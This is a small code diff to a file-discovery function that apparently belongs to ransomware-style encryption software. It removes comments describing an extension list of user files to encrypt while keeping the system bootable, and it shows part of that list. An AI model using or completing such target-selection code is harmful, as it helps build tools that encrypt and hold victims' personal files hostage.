@@ -15,13 +15,6 @@ def discoverFiles(startpath):
         - state is not kept. If this functions raises an Exception at any point,
           There is no way of knowing where to continue from.
     '''
-
-    # This is a file extension list of all files that may want to be encrypted.
-    # They are grouped by category. If a category is not wanted, Comment that line.
-    # All files uncommented by default should be harmless to the system
-    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
-    # BUT applications which depend on such resources may become broken.
-    # This will not cover all files, but it should be a decent range.
     extensions = [
         # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
         'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
